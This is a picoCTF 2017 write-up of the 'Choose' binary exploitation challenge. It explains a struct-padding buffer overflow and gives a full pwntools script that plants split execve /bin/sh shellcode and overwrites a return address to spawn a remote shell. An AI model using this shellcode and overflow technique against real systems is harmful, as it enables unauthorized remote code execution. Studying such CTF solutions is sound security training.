# Choose (final challenge)
#### Writeup by hgarrereyn
* **Binary Exploitation**
* *150 points*
* Description: Unhappy that you can't choose which enemies to fight? Choose your own adventure! Source. Connect on shell2017.picoctf.com:47601. ASLR is not enabled.

# Overview

This program allowed the user to specify `11` enemy types to fight and assign each a `12 char` name. Then the user could fight each of these enemies and win various things.

After that, the user must fight a dragon that was hardcoded to be completely unbeatable.

However, in order to get the flag, you had to exploit the program to be able to get a shell remotely.

# Solution

The vulnerability was a wrong assumption that a group of structs were the same size in memory. Specifically, the programmer assumed that these structs were the same size (`0x14 bytes`):

```c
#define ENEMNAMELEN 12

typedef struct _orc{
    char type;
    short damage;
    int health;
    char name[ENEMNAMELEN];
} orc;

typedef struct _unicorn{
    char type;
    int health;
    short damage;
    char name[ENEMNAMELEN];
} unicorn;
```

Although both structs contain the same fields with the same types, they are specified in a different order. Therefore, due to struct packing the `unicorn` struct actually occupies `0x18 bytes`. The memory structures are as follows:

```
orc (0x14 bytes):

[ type ][ xxxx ][ damage       ]
[ health                       ]
[ name                         ]
[ name                         ]
[ name                         ]

unicorn (0x18 bytes):

[ type ][ xxxxxxxxxxxxxxxxxxxx ]
[ health                       ]
[ damage       ][ xxxxxxxxxxxx ]
[ name                         ]
[ name                         ]
[ name                         ]

```

Notice how the `unicorn` struct is unable to pack the `char` and `short` fields into one 4-byte space because the `int health` must be aligned.

Then later, the following array was created to store user-controlled enemy struct data:

```c
#define NUMMONSTERS 11
#define ENEMSIZE sizeof(orc)

char enemies[ENEMSIZE * NUMMONSTERS];
```

This error allowed an attacker to craft an input that caused a buffer overflow onto a saved return address. For example, if the attacker specified all unicorns, the storage functions would overflow the `enemies` array.

The return address could be overwritten with the address of shellcode placed on the stack.

ASLR was disabled so it was possible to hard-code the stack address that held our shellcode. However, in order to find it, you could simply use existing functionality in the program. See the following lines:

```c
void printEnemy(char * enemy){
    ...
    if(ctfer.wizardSight){
        printf("Your sight shows the enemy at %p\n", enemy);
    }
}
```

So if we had `wizardSight`, the program would print out stack addresses. How do we get that?

```c
void processWinnings(char type){
    switch(type){
        ...
        case 'T':
        case 't':
            printf("You found %s\n", winnings[5]);
            ctfer.wizardSight = 1;
            break;
    	...
    }
}
```

Ok, so in order to get a stack address, we simply have to fight a troll and beat it. Then we can calculate the offset to the first name buffer where we will store our shellcode.

However, we quickly run into a problem: the name buffer only stores `12 bytes` and there is no way we can fit exexcve shellcode into that small a buffer. However, we have `11` name buffers to use.

My solution was to use something I call "leapfrog shellcode" for lack of a better name. Basically, I split the shellcode into `<10 byte` sections (making sure to keep instructions intact). Then I appended short jump instructions that would jump to the next name buffer where execution could continue.

In memory that looked like this:

```
enemy 1:  [junk]
          [junk]
		  [junk]
          [shellcode]      <-- start address
          [shellcode]
		  [shellcode jmp] -.
enemy 2:  [junk]           |
          [junk]           | skip the struct junk
          [junk]           |
          [shellcode] <----'
          [shellcode]
          [shellcode jmp]

etc...
```

# Script

[**exploitChoose.py**]()

```python
# By Harrison Green <hgarrereyn>

from pwn import *

# Found on shell-storm.org:
# http://shell-storm.org/shellcode/files/shellcode-811.php

# Shellcode (/bin/sh on 32 bit)
# 08048060 <_start>:
 # 8048060: 31 c0                 xor    %eax,%eax
 # 8048062: 50                    push   %eax
 # 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 # 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 # 804806d: 89 e3                 mov    %esp,%ebx
 # 804806f: 89 c1                 mov    %eax,%ecx
 # 8048071: 89 c2                 mov    %eax,%edx
 # 8048073: b0 0b                 mov    $0xb,%al
 # 8048075: cd 80                 int    $0x80
 # 8048077: 31 c0                 xor    %eax,%eax
 # 8048079: 40                    inc    %eax
 # 804807a: cd 80                 int    $0x80

# Relative jump:
#  EB CB - where CB is a signed integer to be added to eip


# Modified leapfrog shellocode with added short jumps:

### Name 1
# 31 c0
# 50
# 68 2f 2f 73 68
name1 = '\x31\xc0\x50\x68\x2f\x2f\x73\x68' + '\xeb\x0e'

### Name 2
# 68 2f 62 69 6e
# 89 e3
# 89 c1
name2 = '\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1' + '\xeb\x0d'

### Name 3
# 89 c2
# b0 0b
# cd 80
# 31 c0
name3 = '\x89\xc2\xb0\x0b\xcd\x80\x31\xc0' + '\xeb\x0e'

### Name 4
# 40
# cd 80
name4 = '\x40\xcd\x80'


# Heap layout:
# <name 1 : 12 bytes>
# <junk : 12 bytes>
# <name 2 : 12 bytes> ...


sock = remote('shell2017.picoctf.com', 47601)

# Select 11 unicorns
sock.send(('u\n' * 11))

# Add shellcode
sock.send(name1 + '\n')
sock.send(name2 + '\n')
sock.send(name3 + '\n')
sock.send(name4 + '\n')

# Fill the rest of the names
for i in range(6):
	sock.send('name\n')

# jump to shellcode by overwriting the return address with 0xffffdb9a
sock.send('aa' + '\x9a\xdb\xff\xff' + '\n')

# flee unicorns
sock.send(('f\n' * 11))

# flee dragon
sock.send(('f\n' * 6))

# Game exits but actually jumps to shellcode

# We've got shell
sock.interactive()
```
